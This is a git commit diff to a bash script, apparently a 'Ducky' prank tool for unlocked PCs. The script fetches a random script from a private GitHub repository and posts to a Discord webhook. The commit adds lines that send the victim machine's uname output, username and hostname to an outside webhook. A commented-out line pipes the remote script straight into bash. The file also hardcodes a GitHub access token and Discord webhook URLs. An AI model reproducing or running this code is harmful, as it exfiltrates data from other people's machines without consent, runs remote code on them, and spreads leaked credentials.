94f68f4b7043458c4d5236379fff69ab53af743f
Waz0x <remy.noulin@epitech.eu>
2021-09-09 16:01:22 +0200

    MOD | webhooks more info and new webhook

--- script.sh
+++ script.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-WEBHOOK_URL="https://discord.com/api/webhooks/885173629606834196/Lp9N3Wr86xcgRj2HzI9iOaMMql4Y5pL6iBdX-gQmFC2QhxrpXzuM4tSi6r4TIOJ9wXkA"
+export WEBHOOK_URL="https://discord.com/api/webhooks/885524612589424640/zxAk5zfwuSbb0Pd1---PJzi6m68BD1YHYOSia8cAnrmtCfPXcUhLZ3ZXv95EqpW9pp9f"
 rdm=$(( $RANDOM % 15 ))
 
 wget -q --spider http://google.com
@@ -9,7 +9,7 @@ if [ $? -eq 0 ]; then
 	#curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | bash
 	curl \
 	  -H "Content-Type: application/json" \
-	  -d "{\"username\": \"Ducky\", \"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | sed '2q;d')\", \"url\":\"https://github.com/Waz0x/pc_delock/blob/master/scripts/$rdm.sh\",\"color\":13704477,\"author\":{\"name\":\"$USER | $NAME\"},\"footer\":{\"text\":\"R.I.P.\"}}]}" $WEBHOOK_URL
+	  -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
 else
 	echo "yes"
 	#shutdown now
